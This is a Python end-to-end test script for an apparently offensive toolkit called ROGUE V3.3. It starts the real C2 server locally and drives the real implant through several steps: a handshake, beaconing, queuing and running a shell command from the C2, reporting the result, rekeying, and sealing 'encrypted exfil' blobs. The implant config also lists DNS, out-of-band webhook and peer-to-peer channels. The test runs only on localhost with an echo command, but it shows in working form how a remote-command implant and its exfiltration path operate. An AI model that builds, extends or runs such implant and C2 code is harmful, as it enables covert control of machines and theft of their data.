#!/usr/bin/env python3
"""
ROGUE V3.3 end-to-end test
==========================
Boots the REAL rogue_c2.py flask app on 127.0.0.1 with a fresh keydir, then
drives the REAL rogue_implant.py V2Comms stack against it:

  hello handshake -> beacon (pong) -> queue command -> implant executes
  -> result stored on C2 -> second session (rekey) -> encrypted exfil R2EX.

Run:  ROGUE_KEYDIR=/tmp/e2e_keys python3 tests/e2e_v2.py
"""
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

KEYDIR = os.environ.get("ROGUE_KEYDIR") or os.path.join(tempfile.mkdtemp(), "keys")
os.environ["ROGUE_KEYDIR"] = KEYDIR
C2_PORT = 14555
C2_URL = "http://127.0.0.1:%d/" % C2_PORT

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("  [PASS] %s" % name)
    else:
        FAIL += 1
        print("  [FAIL] %s %s" % (name, detail))


# ---- boot the real C2 -----------------------------------------------------
import rogue_c2 as c2

srv = c2.app
threading.Thread(target=lambda: srv.run(host="127.0.0.1", port=C2_PORT, debug=False, use_reloader=False),
                 daemon=True).start()
time.sleep(1.5)

secret = open(os.path.join(KEYDIR, "operator.secret")).read().strip()
pub = open(os.path.join(KEYDIR, "static_pub.b64")).read().strip()
print("C2 keys ready: secret=%s... pub=%s..." % (secret[:8], pub[:16]))

# ---- import the real implant module ---------------------------------------
import rogue_implant as ri

cfg = {
    "secret": secret,
    "static_pub": pub,
    "c2_hosts": [C2_URL],
    "dns_zone": "",
    "dns_resolver": "",
    "oob_read_url": "",
    "oob_webhook": "",
    "oob_token": "",
    "p2p_ports": (17011,),
    "legacy_fallback": True,
}
ri.ROGUE_V2_CFG = cfg
ri.V2_ENABLED = True

comms = ri.V2Comms(cfg)
print("\n[1] hello handshake + beacon pong")
resp = comms.roundtrip({"o": "beacon", "mesh": {"gw": False, "peers": 0}})
check("beacon returns pong", resp and resp.get("o") == "pong", str(resp))

print("\n[2] C2 registered the bot")
labels = [l for l, s in c2.RV2_SESSIONS.items() if s.get("bot_id")]
check("server session exists", len(labels) >= 1)
bot_id = c2.RV2_SESSIONS.get(labels[0], {}).get("bot_id") if labels else None
check("bot_id mapped", bool(bot_id))
check("bot visible in admin state", bot_id in c2.connected_bots and bot_id in c2.bot_info)

print("\n[3] queue command -> implant pulls + executes + reports result")
import json as _j
req = urllib.request.Request(C2_URL.rstrip("/") + "/command",
                             data=_j.dumps({"beacon_id": bot_id, "command": "echo E2E-OK-%d" % int(time.time())}).encode(),
                             headers={"Content-Type": "application/json"}, method="POST")
print("  queue rc:", urllib.request.urlopen(req, timeout=5).read().decode()[:80])
resp = comms.roundtrip({"o": "beacon", "mesh": {"gw": False, "peers": 0}})
cmd = resp.get("o") if resp else None
check("command delivered over v2", cmd and cmd.startswith("echo E2E-OK"))
if cmd:
    result = subprocess.getoutput(cmd.replace("echo ", "echo ", 1))
    ok = comms.post_result(result)
    check("result delivered", ok)
time.sleep(0.5)
results = c2.command_results.get(bot_id, [])
check("result stored on C2", any("E2E-OK" in r.get("result", "") for r in results),
      str(results)[:120])

print("\n[4] rekey: fresh client session (new ephemeral keys)")
comms2 = ri.V2Comms(cfg)
resp2 = comms2.roundtrip({"o": "beacon", "mesh": {"gw": False, "peers": 0}})
check("second session beacons ok", resp2 and resp2.get("o") == "pong", str(resp2))

print("\n[5] encrypted exfil R2EX round trip")
ri.ROGUE_V2_CFG = cfg
payload = os.urandom(2048)
blob = ri.rv2i_exfil_seal(payload)
check("implant seals R2EX blob", blob is not None and blob.startswith(b"R2EX|"))
plain = c2.rv2c_exfil_open(blob)
check("C2 opens R2EX blob", plain == payload)

print("\n[6] legacy v1 path (compat)")
from Cryptodome.Cipher import AES
import base64 as _b
legacy_msg = _b.b64encode(b"legacy-probe").decode()
check("module-level legacy funcs present", callable(c2.decrypt_command) and callable(ri.decrypt_command))

print("\n======================")
print("E2E: %d passed, %d failed" % (PASS, FAIL))
sys.exit(1 if FAIL else 0)
